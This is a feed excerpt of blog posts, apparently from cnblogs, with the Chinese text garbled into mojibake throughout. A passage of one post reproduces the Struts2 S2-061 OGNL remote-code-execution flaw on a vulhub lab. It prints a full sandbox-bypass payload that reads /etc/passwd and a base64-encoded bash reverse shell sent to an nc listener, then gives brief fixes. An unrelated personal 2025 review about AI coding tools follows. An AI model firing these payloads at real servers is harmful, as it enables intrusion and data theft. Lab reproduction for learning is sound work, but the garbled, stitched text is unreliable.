<p><strong>Rootï¼æ ¹å¯¹è±¡ï¼</strong> æä½çâä¸»ä½å¯¹è±¡âï¼ä¹å°±æ¯ä½ ä¸»è¦æ³è®¿é®/ä¿®æ¹çå¯¹è±¡ã å¨ Struts2 ä¸­ï¼<strong>Root é»è®¤å°±æ¯ ValueStackï¼å¼æ ï¼</strong>ï¼å¼æ æé¡¶å±éå¸¸æ¯å½åç Action å®ä¾ã â è®¿é® Root å¯¹è±¡çå±æ§æ¶ï¼<strong>ä¸éè¦å ä»»ä½åç¼</strong>ï¼ç´æ¥åå±æ§åå³å¯ã</p>
</li>
<li>
<p><strong>Contextï¼ä¸ä¸æï¼</strong> ä¸ä¸ª Map ç»æï¼OgnlContextï¼ï¼ç¸å½äºâè¿è¡ç¯å¢âã éé¢å­æ¾äºåç§è¾å©å¯¹è±¡ãä¸´æ¶åéãç¯å¢ä¿¡æ¯ç­ã å¨ Struts2 ä¸­ï¼<strong>Context å°±æ¯ ActionContext</strong>ï¼åå«äºï¼</p>
<ul>
<li><code>#parameters</code>ï¼è¯·æ±åæ°ï¼</li>
<li><code>#request</code></li>
<li><code>#session</code></li>
<li><code>#application</code></li>
<li><code>#attr</code>ï¼ä¾æ¬¡æ¥æ¾ pageârequestâsessionâapplicationï¼</li>
<li>å¼æ æ¬èº«ï¼ä½ä¸º Rootï¼<br>
â è®¿é® Context éçå¯¹è±¡ï¼å¿é¡»å  <strong>#</strong> åç¼ï¼ä¾å¦ <code>#session.user</code>ã<code>#parameters.name</code></li>
</ul>
</li>
</ol>
<p><strong>OGNLä¸­çéè¦ç¬¦å·</strong></p>
<p>æä¸ä¸ª<code>#%$</code><br>
<code>%</code></p>
<pre><code>%: å¶ç¨éæ¯å¨æ å¿å±æ§ä¸ºå­ç¬¦ä¸²ç±»åæ¶ï¼è®¡ç®OGNLè¡¨è¾¾å¼çå¼ï¼ç±»ä¼¼JSä¸­çå½æ°eval()ã 
ä¾å¦:&lt;s:url value =â%{items.{title}[0]}â/&gt;ãè·åitemså¯¹è±¡ä¸­titleå±æ§ï¼titleä¸ºæ°ç»ï¼åæ°ç»ç´¢å¼ä¸º0ä½ç½®çå¼
</code></pre>
<p><code>#</code></p>
<pre><code>è®¿é® Contextï¼éæ ¹å¯¹è±¡ï¼éçæ°æ®,å sessionãrequestãparametersãapplication ç­æ¶ä½¿ç¨
ä¾å¦:#session.user #parameters.username #request.get('key')
</code></pre>
<p><code>$</code></p>
<pre><code>1. å¨ struts.xml éç½®æä»¶éå¼ç¨ OGNL
2. å¨å½éåèµæºæä»¶ï¼.propertiesï¼éå¼ç¨ OGNL
ä¾å¦:struts.xml éï¼ èµæºæä»¶ï¼welcome=${user.name}
</code></pre>
<p>(2) <strong>OGNL RCEæ¼æ´åç</strong></p>
<p>OGNL RCEæ¼æ´æ¯ <code>Struts2</code> ä¸­ä¸ç±»å¸¸è§çä¸¥éå®å¨é®é¢ï¼ä¸»è¦æºäºæ¡æ¶å¯¹ <code>OGNL</code> è¡¨è¾¾å¼çå¤çä¸å½ã</p>
<p><code>OGNL</code> æ¯ä¸ç§å¼ºå¤§çè¡¨è¾¾å¼è¯­è¨ï¼ç¨äºè®¿é® Java å¯¹è±¡çå±æ§åæ¹æ³.ä½å¨ <code>Struts2</code> ä¸­ï¼å¦æç¨æ·è¾å¥ï¼å¦ <code>HTTP</code> è¯·æ±å¤´ãåæ°ææ ç­¾å±æ§ï¼è¢«ç´æ¥ç¨äº <code>OGNL</code> æ±å¼ï¼èæ²¡æååéªè¯æè½¬ä¹ï¼å°±ä¼å¯¼è´æ³¨å¥æ»å»ã</p>
<p><strong>æ¼æ´å½±åèå´</strong></p>
<p>OGNL RCE æ¼æ´å½±åäº <code>Struts2</code> çå¤ä¸ªåå²çæ¬ï¼</p>
<ul>
<li>å¸¸è§åå½±åçæ¬ï¼ä» <code>Struts 2.0.0</code> å° <code>2.5.x </code>ç³»åï¼å¦ <code>2.5.25</code> ä¹åï¼ï¼é¨å 6.x æ©æçæ¬æç±»ä¼¼é®é¢ãä½è®¸å¤æ§çæ¬ï¼å¦ 2.3.xï¼å·²åæ­¢æ¯æï¼EOLï¼ã<br>
ä¸æ¯ææ <code>Struts2</code> åºç¨é½æåæ»å»ï¼åå³äºéç½®ï¼å¦æ¯å¦ä½¿ç¨å¼ºå¶ <code>OGNL</code> æ±å¼ææ´é²äºç¹å®æä»¶ï¼ãä½éçç³»ç»ç¹å«å±é©ã</li>
</ul>
<h2 id="3æ¼æ´å¤ç°">3.æ¼æ´å¤ç°</h2>
<p>æ¼æ´å¤ç°ç¯å¢<br>
åå¤å¥½<code>docker</code></p>
<ol>
<li><strong>é¶æºç¯å¢</strong>ï¼ä½¿ç¨ vulhubé¶åºï¼ï¼</li>
</ol>
<pre><code class="language-bash">åévulhubä»åº
git clone --depth 1 https://github.com/vulhub/vulhub.git
å°æ¼æ´å°å
cd vulhub/struts2/s2-061
</code></pre>
<p>æåéå</p>
<pre><code class="language-sh">docker-compose up -d 
</code></pre>
<p>æåå¤±è´¥çå¯ä»¥ä½¿ç¨è¿ä¸ªä»åºçéåæºéç½®å·¥å·:</p>
<pre><code class="language-sh">git clone https://github.com/hzhsec/docker_proxy.git
chmod +x *.sh
./docker-proxy.sh
</code></pre>
<p>åæå</p>
<pre><code class="language-sh">docker-compose up -d 
</code></pre>
<p>ä½¿ç¨docker psæ¥çéåæ¯å¦è¿è¡</p>
<p>è®¿é®ï¼<a href="http://xn--IP-eo8d177o:8080" target="_blank" rel="noopener nofollow">http://é¶æºIP:8080</a><br>
<img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116153643875.png" class="lazyload"></p>
<ul>
<li>å°è¯idæ³¨å¥ä»£ç </li>
</ul>
<pre><code>http://192.168.41.128:8080/.action?id=%{'hzhsec'+(1+2).toString()}
urlç¼ç 
http://192.168.41.128:8080/.action?id=%25%7B'hzhsec'%2B(1%2B2).toString()%7D
</code></pre>
<p><img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154120948.png" class="lazyload"><br>
æåå°idçå¼æ´æ¢æ§è¡</p>
<p>å°è¯poc</p>
<pre><code>%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]). (#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]). (#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)). (#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")). (#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)). (#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("cat /etc/passwd")). (#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}

ç¼ç :
%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22cat%20%2Fetc%2Fpasswd%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D
</code></pre>
<p><img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154307914.png" class="lazyload"><br>
æåè¯»å<code>/etc/passwd</code><br>
<img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154354648.png" class="lazyload"></p>
<p>å°è¯ä¿®æ¹å½ä»¤åå¼¹shell</p>
<pre><code>shellå½ä»¤
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
æ¿æ¢ä¸é¢çcatå½ä»¤
</code></pre>
<p>æ»å»æº:</p>
<pre><code>nc -lvvp 4444 å¯å¨çå¬
</code></pre>
<p><img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154843948.png" class="lazyload"><br>
åépayload</p>
<pre><code>http://192.168.41.128:8080/.action?id=%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4yMTAuNjYuMTA4LzQ0NDQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D
</code></pre>
<p>æåä¸çº¿:<br>
<img alt="image.png" loading="lazy" data-src="https://jsd.cdn.zzko.cn/gh/hzhsec/upload@main/20260116154954834.png" class="lazyload"></p>
<h3 id="pocåç">pocåç</h3>
<ol>
<li>
<p><strong>è·å Tomcat ç InstanceManager</strong> <code>#instancemanager</code> = <code>#application["org.apache.tomcat.InstanceManager"]</code> â ä» <code>ServletContext</code>ï¼applicationï¼éæ¿å°<code> Tomcat</code> çå®ä¾ç®¡çå¨ï¼å®è½âæ´åânew åºä»»ä½ç±»çå®ä¾ï¼å³ä½¿ OGNL æ²ç®±ä¸åè®¸ï¼ã</p>
</li>
<li>
<p><strong>æ¿å°å½åç ValueStackï¼å¼æ ï¼</strong> <code>#stack</code> = <code>#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]</code> â å¼æ æ¯ <code>Struts2</code> çæ ¸å¿ï¼éé¢å­ç <code>Action</code>ã<code>request</code>ã<code>session</code> ç­ææä¸ä¸æä¿¡æ¯ã</p>
</li>
<li>
<p><strong>ç¨ <code>BeanMap</code> é­æ³ç»è¿è®¿é®éå¶</strong>ï¼ææ ¸å¿çæ²ç®±ç»è¿æå·§ï¼ <code>#bean</code> = <code>#instancemanager.newInstance("org.apache.commons.collections.BeanMap")</code> <code>#bean.setBean(#stack)</code> â åå»ºä¸ä¸ª <code>BeanMap</code>ï¼ä¸ç§è½æä»»æå¯¹è±¡å½ Map ç¨çé»ç§æç±»ï¼ï¼ç¶åæå¼æ å¡è¿å»ã ä¹åå°±è½éè¿ <code>.get("context")</code>ã <code>.get("memberAccess")</code> è¿ç§æ¹å¼ï¼è®¿é®åæ¬ä¸åè®¸ç´æ¥è®¿é®çç§æå­æ®µã</p>
</li>
</ol>
<p>ç»§ç»­é¾å¼æä½ï¼ â åæ¿å° <code>context</code> â åæ¿å° <code>_memberAccess</code>ï¼OGNL çå®å¨ç®¡çå¨å¯¹è±¡ï¼æ§å¶ä»ä¹è½æ§è¡ãä»ä¹ç±»è¢«ç¦æ­¢ï¼</p>
<ol start="4">
<li>
<p><strong>æ¸ç©ºæ²ç®±é»åå</strong>ï¼çæ­£è§£é¤éå¶ï¼ <code>#emptyset = #instancemanager.newInstance("java.util.HashSet") </code> <code>#bean.put("excludedClasses", #emptyset)</code> <code>#bean.put("excludedPackageNames", #emptyset)</code> â æ OGNL çä¸¤ä¸ªé»ååï¼ç¦æ­¢çç±» + ç¦æ­¢çåï¼å¨é¨æ¸ç©ºæç©ºéåã â ä»æ­¤ OGNL ä»ä¹ç±»é½è½ç¨äºï¼ä»ä¹åé½è½è®¿é®äºï¼æ²ç®±å½»åºå¤±æï¼ã</p>
</li>
<li>
<p><strong>åå¤å½ä»¤å¹¶æ§è¡</strong> <code>#arglist</code> = <code>#instancemanager.newInstance("java.util.ArrayList")</code> <code>#arglist.add("cat /etc/passwd")</code> â åå»ºä¸ä¸ªåæ°åè¡¨ï¼éé¢æ¾è¦æ§è¡çå½ä»¤ã</p>
</li>
</ol>
<p><code>#execute</code> = <code>#instancemanager.newInstance("freemarker.template.utility.Execute") #execute.exec(#arglist)</code> â ç¨ Freemarker èªå¸¦ç Execute å·¥å·ç±»æ¥æ§è¡ç³»ç»å½ä»¤ï¼è¿ä¸ªç±»æ¬æ¥ä¸åè®¸è¢« OGNL è°ç¨ï¼ä½ç°å¨æ²ç®±æ²¡äºï¼å°±è½ç¨äºï¼ã</p>
<p>**æ»ç»ï¼ è¿ä¸ªpayload åç¨ Tomcat InstanceManager + BeanMap é­æ³é¾ â æ¾å°å¹¶ä¿®æ¹ OGNL çå®å¨ç®¡çå¨ â æ¸ç©ºææé»åå â æåç¨ Freemarker ç Execute ç±»æ§è¡ cat /etc/passwdã</p>
<h2 id="4æ¼æ´é²å¾¡">4.<strong>æ¼æ´é²å¾¡</strong></h2>
<p>1ãåçº§å°Struts 2çå®å¨çæ¬ï¼æ¯å¦<code>2.3.32</code>æ<code>2.5.16</code>ï¼è¿äºçæ¬åå«äºå¯¹åºçå®å¨ä¿®å¤<br>
2ãç¦ç¨OGNLè¡¨è¾¾å¼çæ§è¡ï¼æèä½¿ç¨Struts 2çå®å¨<code>mechansim</code>ã</p>
<p><strong>åè´£å£°æ</strong><br>
æ¬ææ¡£æåå«çæ¼æ´å¤ç°æ¹æ³ãææ¯ç»èåå©ç¨ä»£ç ï¼<strong>ä»éç¨äºææçå®å¨æµè¯ãæè²å­¦ä¹ ä¸ç ç©¶ç®ç</strong>ã<br>
<strong>ä¸¥ç¦</strong>å¨æªè·å¾æç¡®ææçæåµä¸ï¼å¯¹ä»»ä½ç³»ç»è¿è¡æµè¯ææ»å»ãä»»ä½ä¸å½ä½¿ç¨æå¯¼è´çæ³å¾è´£ä»»ååæï¼åç±ä½¿ç¨èèªè¡æ¿æã<br>
ä½èä¸ææ¡£æä¾èä¸æ¿æä»»ä½å æ»¥ç¨æ¬ææ¡£ä¿¡æ¯èäº§ççç´æ¥æé´æ¥è´£ä»»ãè¯·éµå®æ¨æå¨å°çæ³å¾æ³è§ï¼å¹¶å§ç»è·µè¡è´è´£ä»»çç½ç»å®å¨å®è·µã</p>

</div>
<div class="clear"></div>

		<p class="postfoot">
			posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 16:02">2026-01-16 16:02</span>&nbsp;
<a href="https://www.cnblogs.com/hzhsec">hzhsec</a>&nbsp;
éè¯»(<span id="post_view_count">13</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19492577);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19492577', targetLink: 'https://www.cnblogs.com/hzhsec/p/19492577', title: 'Apache Struts2 OGNL RCEæ³¨å¥' })">ä¸¾æ¥</a>

		</p>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æç2025ï¼åé¡¹ç®ãè·å¯ä¸ãè§äººãå¥æ³¢ãæ¬å®¶ãç»´æãååä¸æµ· ]]></title>
    <link>https://www.cnblogs.com/HaiJun-Aion/p/19492492</link>
    <guid>25820d93e4fa2de985f04ae28c9f3542</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/HaiJun-Aion/p/19492492" title="åå¸äº 2026-01-16 15:50">
    <span role="heading" aria-level="2">æç2025ï¼åé¡¹ç®ãè·å¯ä¸ãè§äººãå¥æ³¢ãæ¬å®¶ãç»´æãååä¸æµ·</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>2025 å¹´ï¼å¦æè®©æç¨ä¸å¥è¯å®æ§ï¼æä¼è¯´ï¼<strong>æå¨åå¼ºï¼ä¹å¨éæ°éæ©èªå·±çäººçç»æã</strong></p>
<p>è¿ä¸å¹´æåäºå¾å¤äºï¼å¤å°æä¸åº¦ä¸æ¢åå¤´çãè¡¨é¢ä¸çï¼æä¸ç´å¨âå¾åâï¼ååå®¹ãåé¡¹ç®ãè·å¯ä¸ãè§äººãå¥æ³¢ãæ¬å®¶ãç»´æãååä¸æµ·ãå¯åªææèªå·±ç¥éï¼çæ­£æç£¨äººçä¸æ¯å¿ï¼æ¯é£ç§åå¤åºç°çç¬é´ââæçªç¶æè¯å°ï¼æä¸æ¯å¨å²ï¼ææ¯å¨<strong>è¢«çæ´»æ¨çè·</strong>ã</p>
<p>æç¡®å®æ¿å°äºä¸äºç»æãåå®¹æè¿ççæ¶å»ï¼å°çº¢ä¹¦æ¶¨äºç²ï¼è§é¢åªè¾ä»æå¿èä¹±å°æ¢æ¢é¡ºæï¼æäººå¼å§æ¥é®æãä¿¡æãçè³æ¿æä»è´¹ãé£æ®µæ¶é´ææä¸ç§å¾ç½è§çç¬å®ï¼åªè¦æè¯å­¦ãè¯ç£¨ï¼å¾å¤äºæé½è½åæãé£ç§âæå¥½åä»ä¹é½è½åâçèªä¿¡ï¼å¨è¿ä¸å¹´éåå¤ææä»ä½è°·éæèµ·æ¥ã</p>
<p>ä½åæ ·æ¯è¿ä¸å¹´ï¼æä¹äº¤äºä¸ç¬ä¸è½»çå­¦è´¹ãä¸æ¯é±é£ä¹ç®åï¼æ´æ¯å¯¹äººãå¯¹æºä¼ãå¯¹âçèµ·æ¥å¾ç¾âçæ¿è¯ºçé£ç§å¤©çãææ¾å ä¸ºä¿¡ä»»åäºä¸ä¸ªå¾éçå³å®ï¼ä¹æ¾å¨åäº¬çå¤éæäºæä¸æ¡æ¡æå¼ç®æ¸æ¥ï¼æååç°ä¸æ¯å¼ä¸å¼çé®é¢ï¼èæ¯æåæä¸å»ï¼å°±ä¼æèªå·±èå°æ²¡æ ·å­ã</p>
<p>æä¸æ³æè¿ç¯å¤çåææµæ°´è´¦ï¼ä¹ä¸æ³åæé¸¡æ±¤ãæåªæ³æè¿ä¸å¹´æçå®çé¨åæåºæ¥ï¼ææä¹ä¸ç¹ç¹åå¼ºï¼æä¹è¢«ç°å®æè²ï¼æä¹æ­¢æãæä¹ç»´æãæä¹æèªå·±ä»åºå¢éæ¡åæ¥ã</p>
<hr>
<h2 id="1-æå¼å§æè¡¨è¾¾å½æä¸ä»¶æ­£äº">1. æå¼å§æè¡¨è¾¾å½æä¸ä»¶æ­£äº</h2>
<p>ä¸æå¼å§ï¼ææå¾å¤æ³¨æåæ¾å¨âè¯´æ¸æ¥âè¿ä»¶äºä¸ã</p>
<p>ä»¥åæä¹è¾åºï¼ä½æ´å¤åéæè®°å½ã2025 å¹´ä¸ä¸æ ·ï¼æå¼å§è®¤çç»è¥è¡¨è¾¾ï¼æ¯å¤©é»ç ãæ¯å¤©å°è¯ãæ¯å¤©å¤çãå¬ä¼å·æäºæ´æç¡®çæ­£åé¦ï¼æå ç¯æç« çªç¶è¢«æ¨èµ·æ¥ï¼è¯è®ºåºå¼å§åºç°éçäººçå±é¸£ï¼åå°ä¹å¼å§æäººæ¥é®æé®é¢ãé£ç§æè§å¾å¥å¦ââæåçä¸è¥¿ä¸ååªå±äºæèªå·±ï¼å®å¼å§è¿å¥å«äººççæ´»ã</p>
<p><strong>ä»å¹´ä½¿ç¨æå¤çAI IDE å°±æ¯Traeï¼ä¹åå äºç¬¬ä¸æçTrae å¾ææ´»å¨ï¼è·å¾äºç¬¬äºåï¼Traeç»ææ¥äºå¾å¤æé¿ã</strong></p>
<h3 id="ä»å¹´å¨trae-æ¹é¢çå®è·µ">ä»å¹´å¨Trae æ¹é¢çå®è·µï¼</h3>
<ol>
<li><a href="https://juejin.cn/post/7462542925915848744" target="_blank" rel="noopener nofollow">å­èè·³å¨æ¨åºAIç¼ç¨ç¥å¨Traeï¼åºäºTrae ä» 0 å¼åä¸ä¸ªGoogle æä»¶ï¼</a><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154541565-1153543642.png" class="lazyload"></li>
</ol>
 <hr> 
<hr> 
<p>2.<a href="https://github.com/TickHaiJun/Dompet-App-React-Native" target="_blank" rel="noopener nofollow">åºäºTrae å¼åçç¬¬ä¸ä¸ªAPP</a></p>
<p>Trae ååºæ¥Claudeæ¨¡åæ¶ï¼è¿å¤æµè¯å®çè½åï¼å½æ¶è±äº5ä¸ªå°æ¶æåºä¸ä¸ªAppï¼é¡¹ç®å¹¶ä¸è¿å¼æºäº<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154605040-710350693.png" class="lazyload"></p>
<hr> 
<ol start="3">
<li><a href="https://github.com/TickHaiJun/Podcast" target="_blank" rel="noopener nofollow">åºäºTrae è®¾è®¡çååç¨¿</a></li>
</ol>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154616548-830934542.png" class="lazyload"></p>
<p>æä¹å¼å§ç¢°è§é¢ãè¯´å®è¯ï¼ä¸å¼å§å¾ç¼çï¼åªä¸ä¸ªä¸åéçè§é¢ï¼è¦è±æä¸¤ä¸ä¸ªå°æ¶ãå¡ç¹ãéä¹ãå­å¹ãèå¥ï¼åªä¸æ ·é½ä¸åçèµ·æ¥é£ä¹ç®åãæä¸åº¦æçæ¯ä¸æ¯æä¸éåï¼ä½åä¸çå¿ãæç¥éè¿æ¯ä¸åæä¹åæ²¡å°è¯è¿çè½åï¼ä¸æ¦ç»åºæ¥ï¼å°±æ¯æ°çè·¯ã</p>
<p><a href="https://www.bilibili.com/video/BV1VHQLYvE6C/?vd_source=824b78ff76f90d1fc4e5e732bb09b3c1" target="_blank" rel="noopener nofollow">åºäºTraeè¿åäºååè¿åè®¾è®¡ç¨¿ï¼æ²¡æ³å°è§é¢ç«äº</a><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154623908-888239039.png" class="lazyload"></p>
<hr> 
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154629072-645488754.png" class="lazyload"></p>
<p>è¿ä¸æ®µç»æçç¤¼ç©ï¼æ¯ä¸ç§æ´ç¨³å®çèªä¿¡ï¼å¾å¤äºçèµ·æ¥å¤æï¼åªè¦æå¼ãä¸æ­¥æ­¥åï¼å°±ä¼åå¾å¯æ§ã</p>
<hr>
<h2 id="2-æææ³æ³åæäºä½åéè¿vibe-coding">2. æææ³æ³åæäºä½åéè¿Vibe Coding</h2>
<p>äºæå°å«æï¼æè¿å¥äºä¸ç§âæéææ´»âçç¶æã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154639946-1131692297.png" class="lazyload"></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2ODI4OTMwMw==&amp;mid=2247492557&amp;idx=1&amp;sn=8949270a3c3bf6f409d6e6046cb8411a&amp;scene=21#wechat_redirect" target="_blank" rel="noopener nofollow">ä»æµæå°è½å°ï¼è®°å½æä»¬ç¬¬ä¸æ¬¡æåå°å¤§æ¨¡åâå¡âè¿ä¸å¡çæ²æåç¨</a></p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154652143-1447815485.png" class="lazyload"></p>
<p>å¹´ååäºèªå·±ç¬¬ä¸æ¬¾AIåºç¨</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154658992-1414743353.png" class="lazyload"></p>
<p>é£æ®µæ¶é´æåäºå¾å¤ä½åï¼ä¹å¼æºäºä¸å°ä¸è¥¿ãè¯´ç½äºï¼å°±æ¯ææ³æ³ä»èå­éæåºæ¥ï¼åæä¸ä¸ªè½è·ãè½çãè½ç¨ãè½è¢«å«äººçè§£çä¸è¥¿ã</p>
<p>ä¸æ­¤åæ¶ï¼æä¹ç»å¢éåäºå¤æ¬¡åäº«ï¼è®²ææè¿å¨åä»ä¹ãæä¹åãè¸©äºä»ä¹åãæä¹ç»å¼ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154706427-993472232.png" class="lazyload"></p>
<p>ä¸­é´æä¸¤æ¬¡æºä¼æå°è±¡å¾æ·±ï¼ä¸æ¬¡æ¯æ¥èªä¸å®¶å¾å¤§çå¨è¯¢å¬å¸ï¼ä¸æ¬¡æ¯åºæµ·æ¹åçè¿ç¨éè¯·ãå®ä»¬é½æºè¯±äººï¼ä½æå½æ¶é½æç»äºãåå å¾ç®åï¼æç¥éæè¿æ²¡åå¤å¥½ãè½åæ²¡å°é£ä¸ªååº¦ãå¿ææ²¡å°é£ä¸ªç¨³å®åº¦ï¼æä¸æ³é è¿æ°ä¸å»ï¼ç¶åé ç¡¬ææä½ã</p>
<p>ä¹æä¸äºå°å°çæåï¼æäººä¹°äºæåçä¸è¥¿ï¼è½ç¶æ°éä¸ç®å¤ï¼ä½è¶³å¤è®©æç¡®è®¤ââæåçä¸è¥¿ä¸æ¯èªå¨ï¼æ¯ççæäººéè¦ãæ´éè¦çæ¯ï¼è¶æ¥è¶å¤çç½åéè¿æçåå®¹è®¤è¯æï¼èç³»æï¼é®æé®é¢ã</p>
<p>é£å ä¸ªæææå¤§çæ¶è·ä¸æ¯âåäºå¤å°âï¼èæ¯ä¸ä¸ªæ´æ´ç´ çç»è®ºï¼<strong>æ³æ³ä¸å¼é±ï¼ååºæ¥æå¼é±ã</strong></p>
<hr>
<h2 id="3-æäººæ¿æä¸ºæçè½åä¹°å">3. æäººæ¿æä¸ºæçè½åä¹°å</h2>
<p>ä¹æå°åä¸æï¼æçå¯ä¸å¼å§åä¸é¨âæ­£ç»äºâã</p>
<p>å¨è¯¢åå¤äºãæçæ¯ä¸´æ¶é®ç­ï¼æçæ¯æ´ç³»ç»çéªè·ãææ¥äºä¸ä»½éªè·ï¼ä¹å æ­¤è®¤è¯äºå ä½å¾æç¼çæåï¼é½æ¯å±±è¥¿çãæä»¬èé¡¹ç®ãèéæ©ãèæä¹æäºæåæï¼ä¹èæä¹å¨ç°å®éä¸æèªå·±å¼ä¸¢ã</p>
<p>è¿ä»½å³ç³»å¾çè´µãå®ä¸æ¯é£ç§äºç¸å¹æ§çç­é¹ï¼èæ¯æè½ææ¾æå°ï¼å¯¹æ¹å ä¸ºæçå»ºè®®å°èµ°äºå¼¯è·¯ï¼äºææ¨è¿å¾æ´é¡ºï¼èæä¹å ä¸ºå¯¹æ¹çåé¦åå¾æ´åå®ãé£ç§âæççå¸®å°äºäººâçæå°±æï¼æ¯æ°å­æ´å®å¨ã</p>
<p>æä¹å¨è¿ä¸æ®µç¬¬ä¸æ¬¡æ´æ¸æ°å°çå°æçä½ç½®ï¼æä¸æ¯åªè½åå¤´åé¡¹ç®çäººï¼æè¿å¯ä»¥æç»éªè®²æ¸æ¥ï¼æå¤ææç®åï¼æå«äººå¡ä½çç¹æåºæ¥ãè¿æ¯ä¸ç§è½åï¼ä¹æ¯ä¸ç§è´£ä»»æã</p>
<p>è¿ä¸æ®µè®©æç¸ä¿¡ï¼é èªå·±æåºæ¥çå£ç¢ï¼æ¢ï¼ä½ç¨³ã</p>
<hr>
<h2 id="4-æéæ°ç¡®è®¤äºé±è¯¥è±å¨åª">4. æéæ°ç¡®è®¤äºâé±è¯¥è±å¨åªâ</h2>
<p>å½åºæåå®¶äººèªé©¾åºå»ç©äºä¸è¶ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154715567-288570006.png" class="lazyload"></p>
<p>é£å¾å¤§ï¼å¤©å¾é«ï¼ç¾èå¾é¦ãæä»¬å¨èåä¸å¾äºä¸å¤©ï¼æç»ç¶æ¯å®æäºè¶éå¡ä¸è½¦ï¼è®©ä»ä»¬å¨èå°ä¸è·ä¸åï¼æåå§å§éªäºé©¬ï¼ç¬å¾ååå°å°æ¶åãé£å å¤©æå¾æ¾æ¾ï¼çè³æç¹ææââåæ¥æåªåè¿ä¹ä¹ï¼ææ³æ¢æ¥çå¹¶ä¸æ¯æä¸ªå¤´è¡ï¼èæ¯è¿ç§âæè½è®©ä»ä»¬å¼å¿âçåºæ°ã</p>
<p>æä»¥åå¯¹è±é±å¾è°¨æï¼æ»è§å¾è¦æçãè¦ç®è®¡åæ¥ãå¯å½ææé±è±å¨å®¶äººèº«ä¸ï¼é£ç§èå¦å¾ç´æ¥ï¼ä¸éè¦è¯æï¼ä¸éè¦è§£éï¼è±åºå»å°±æ¯ä¸ç§âææå¾ä½äºâçç¡®è®¤ã</p>
<hr>
